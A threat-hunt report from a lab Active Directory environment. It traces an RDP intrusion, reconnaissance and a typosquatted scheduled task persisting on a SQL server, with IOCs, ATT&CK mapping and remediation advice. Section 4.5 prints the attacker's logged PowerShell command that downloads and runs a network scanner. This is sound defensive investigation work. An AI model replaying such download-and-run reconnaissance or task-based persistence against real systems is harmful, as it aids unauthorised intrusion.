# Threat Hunt Investigation Report

**Classification:** TLP:AMBER (Lab Exercise)
**Report Type:** Proactive Threat Hunt — Confirmed Compromise
**Environment:** ALLIANCE.htb (Active Directory)
**Analyst:** SOC L1
**Date of Investigation:** 2026-06-15 – 2026-06-24
**Incident Window:** 2026-06-09 12:41 UTC – 2026-06-09 22:38 UTC
**Severity:** High
**Status:** Confirmed — Escalated for Containment & IR

---

## 1. Executive Summary

A proactive threat hunt was initiated based on a hypothesis that a threat actor had established persistence via a scheduled task disguised to blend in with legitimate Windows administrative tasks. The hunt confirmed this hypothesis and traced the full attack chain from initial access through to payload execution.

**Key finding:** A threat actor gained access to the environment via RDP using valid domain credentials (`ALLIANCE\John.Shepard`), performed internal network reconnaissance using a legitimately signed tool, and established persistence by planting a typosquatted scheduled task (`SQLConnectvityCheck`) on the SQL server that executes a disguised payload (`SQLBackup.exe`) with SYSTEM-level privileges while impersonating the compromised account.

No definitive initial-access vector into the `John.Shepard` account itself (e.g., phishing, credential theft, external brute force) was identified within the available log retention window — investigation of this is a recommended next step (see Section 7).

---

## 2. Hunt Hypothesis

> A threat actor has established persistence on one or more hosts within the environment by creating or modifying a scheduled task with a name designed to blend in with legitimate Windows tasks. Given the degraded logging posture, the task may have gone undetected and could be actively executing a malicious payload.

---

## 3. Scope

| Item | Detail |
|---|---|
| **In-scope hosts** | ALLIANCE-DC, ALLIANCE-WS04, ALLIANCE-WS07, alliance-central (SQL Server), admsrv01.htb, siem.htb |
| **Log sources available** | Windows Security Event Log, Sysmon, PowerShell Operational, Task Scheduler Operational (Windows); auditd (Linux) |
| **Known logging gaps (identified during hunt)** | Task Scheduler Operational has short retention — no registration/execution history beyond a few days. Logon/Logoff auditing (Event 4624/4634) is not fully configured on workstation hosts. Some Sysmon events were dropped under load on at least one host. |
| **Tooling used** | Kibana Discover (KQL + field statistics/aggregation), raw event export to CSV, Python/pandas for offline correlation and validation |

---

## 4. Investigation Timeline & Evidence

All findings below were independently validated against raw exported log data (CSV export from Kibana Discover, cross-referenced field-by-field).

### 4.1 Persistence Mechanism — Typosquatted Scheduled Task

Baselining all custom (non-Microsoft) scheduled tasks across the domain revealed a cluster of admin-created tasks (`MorningReport`, `DesktopBackup`, `TempFilesCleanup`, `AntivirusUpdate`, etc.) all registered via the same PowerShell provisioning script. Among these, two near-identical task names were observed:

| Task Name | Host(s) Observed | Notes |
|---|---|---|
| `\SQLConnectivityCheck` (correct spelling) | `alliance-ws07`, `alliance-ws04` | Consistent with the legitimate baseline naming convention |
| `\SQLConnectvityCheck` (missing "i" — **typosquat**) | `alliance-central` **only** | Present exclusively on the SQL server — the host where the malicious payload later executed |

**Assessment:** The single-character typo is a deliberate masquerading technique (T1036) designed to visually blend in with the legitimate task of the same theme, while being a distinct object that the attacker fully controls.

### 4.2 Malicious Payload Execution

**Timestamp:** 2026-06-09 22:37:53.015 UTC
**Host:** alliance-central
**Event:** Security 4688 (Process Creation)

```
process.executable       : C:\Users\Public\Pictures\SQLBackup.exe
SubjectUserName           : ALLIANCE-CENTRA$   (SYSTEM, Logon ID 0x3e7)
TargetUserName             : john.shepard
TokenElevationType        : %%1937 (Full)
MandatoryLabel            : S-1-16-12288 (High Integrity)
```

**Assessment:** The Task Scheduler engine (running as SYSTEM) launched this process while impersonating a stored credential belonging to `john.shepard`, granting the payload a fully elevated, high-integrity token. The executable's name (`SQLBackup.exe`) is thematically consistent with a SQL maintenance task, but its location — a public Pictures folder — is highly anomalous for legitimate software and inconsistent with any documented administrative process.

### 4.3 Initial Access — RDP Logon

**Timestamp:** 2026-06-09 12:41:09.624 UTC
**Host:** alliance-ws07
**Event:** Security 4688 (Process Creation) — earliest process under compromised session

```
process.executable  : C:\Windows\System32\TSTheme.exe
SubjectUserName       : ALLIANCE-WS07$ (SYSTEM)
TargetUserName          : John.shepard
SubjectLogonId          : 0x7b9417
```

**Assessment:** Standard Windows Security auditing for successful logons (Event 4624) was not available for this session due to incomplete Logon/Logoff auditing configuration on this host. The session was instead reconstructed by identifying the earliest process execution tied to the session's Logon ID — `TSTheme.exe`, a standard RDP theme-initialization process, confirming this was the start of a Remote Desktop session.

### 4.4 Origin of the Intrusion

**Timestamp:** 2026-06-09 12:41:09.833 UTC (same second as logon)
**Host:** alliance-ws07
**Event:** Sysmon Event ID 13 (Registry Value Set)

```
registry.path  : HKU\S-1-5-21-...-1107\Volatile Environment\2\CLIENTNAME
registry.value : kali
```

**Assessment:** Windows automatically populates the `CLIENTNAME` registry value under a user's Volatile Environment key at RDP session establishment, recording the connecting client machine's hostname. This confirms the session originated from a host named `kali` — consistent with a Kali Linux attack platform.

### 4.5 Reconnaissance Activity

**Timestamp:** 2026-06-09 12:55:13.973 UTC
**Host:** alliance-ws07
**Event:** PowerShell Operational 4104 (Script Block Logging)
**Actor:** john.shepard

```powershell
$url = "https://www.softperfect.com/download/files/netscan_portable.zip";
$out = "C:\Users\Public\netscan_portable.zip";
Invoke-WebRequest -Uri $url -OutFile $out;
Expand-Archive $out -DestinationPath "C:\Users\Public\SoftPerfect";
& "C:\Users\Public\SoftPerfect\x86_64\netscan.exe"
```

Execution of `netscan.exe` was confirmed at `12:55:28.050` under the same session (Logon ID `0x7b9417`), running at Medium integrity with a Limited token — consistent with a normal (non-elevated) interactive user session.

**Assessment:** The threat actor downloaded and ran SoftPerfect Network Scanner, a legitimate and digitally signed network discovery tool. This is a common living-off-the-land (LOLBin-adjacent) technique: using trusted, signed software for reconnaissance to reduce the likelihood of AV/EDR detection.

---

## 5. Attack Timeline (Consolidated)

| Time (UTC) | Host | Actor | Action |
|---|---|---|---|
| 2026-06-09 12:41:09 | alliance-ws07 | John.shepard (from `kali`) | RDP logon session established |
| 2026-06-09 12:55:13 | alliance-ws07 | john.shepard | PowerShell downloads SoftPerfect Network Scanner |
| 2026-06-09 12:55:28 | alliance-ws07 | john.shepard | netscan.exe executed — internal network reconnaissance |
| 2026-06-09 22:37:53 | alliance-central | SYSTEM (impersonating john.shepard) | Hijacked `SQLConnectvityCheck` task executes `SQLBackup.exe` |

---

## 6. Indicators of Compromise (IOCs)

| Type | Value |
|---|---|
| Compromised account | `ALLIANCE\John.Shepard` |
| Attacker source host | `kali` (via RDP) |
| Malicious scheduled task | `\SQLConnectvityCheck` (note: typo, on `alliance-central`) |
| Malicious file path | `C:\Users\Public\Pictures\SQLBackup.exe` |
| Recon tool staging path | `C:\Users\Public\SoftPerfect\x86_64\netscan.exe` |
| Recon tool download URL | `https://www.softperfect.com/download/files/netscan_portable.zip` |

---

## 7. MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Persistence | Scheduled Task/Job | T1053.005 |
| Defense Evasion | Masquerading (typosquatted task name) | T1036 |
| Initial Access / Lateral Movement | Remote Services: RDP | T1021.001 |
| Command and Control / Ingress | Ingress Tool Transfer | T1105 |
| Discovery | Network Service Discovery | T1046 |
| Privilege Escalation | Access Token Manipulation (impersonation via scheduled task) | T1134 |

---

## 8. Impact Assessment

- **Confidentiality:** Elevated — attacker performed network reconnaissance and gained SYSTEM-level code execution on a SQL Server (potential access to sensitive database contents).
- **Integrity:** Elevated — attacker-controlled binary executed with a high-integrity token on a critical asset.
- **Availability:** No direct impact observed at time of report; persistence mechanism could be leveraged for future disruptive action.
- **Scope:** Confirmed on `alliance-ws07` (initial access, recon) and `alliance-central` (persistence, execution). Other hosts (ALLIANCE-DC, ALLIANCE-WS04) were baselined but showed no direct evidence of compromise within the available log window.

---

## 9. Recommendations

1. **Immediate containment:**
   - Disable/reset the `ALLIANCE\John.Shepard` account and force credential rotation.
   - Isolate `alliance-ws07` and `alliance-central` from the network pending forensic imaging.
   - Delete/disable the `\SQLConnectvityCheck` scheduled task on `alliance-central`; do not simply delete `SQLBackup.exe` without preserving a forensic copy.

2. **Extended hunting:**
   - Search the environment for the `SQLBackup.exe` file hash on other hosts.
   - Review RDP logs for any additional sessions from external/unrecognized hostnames.
   - Audit all scheduled tasks domain-wide for further typosquatted or near-duplicate names.

3. **Logging & detection improvements:**
   - Enable full Logon/Logoff auditing (Event 4624/4634) on all workstations — this was a critical visibility gap during this hunt.
   - Increase Task Scheduler Operational log retention/size to prevent rotation before registration/execution events can be reviewed.
   - Investigate and resolve Sysmon event-drop issues on affected hosts (`Events dropped from driver queue`).
   - Consider alerting on scheduled task names with high string-similarity to existing legitimate tasks (typosquat detection).

4. **Root cause investigation (open item):**
   - The mechanism by which `John.Shepard`'s credentials were obtained or misused for the initial RDP logon was not determined within the available log retention. Recommend investigating for phishing, credential reuse, or external-facing exposure as a follow-up workstream.

---

## 10. Analyst Notes on Methodology

This investigation relied heavily on cross-source correlation due to real-world-style logging gaps: no single log source told the complete story. Key techniques used:

- **Baselining before hunting:** enumerating all scheduled task names domain-wide before judging any single one as suspicious.
- **Pivoting on Logon ID** to reconstruct session activity when direct logon events (4624) were unavailable.
- **Using non-traditional artifacts** (the `CLIENTNAME` registry value under Volatile Environment) to attribute a connecting client hostname when standard logon telemetry was incomplete.
- **Independent verification**: all findings in this report were validated directly against exported raw log data rather than relying on a single tool's summary view, which also surfaced a discrepancy in the originally reported task name (a one-character typo with direct forensic significance).
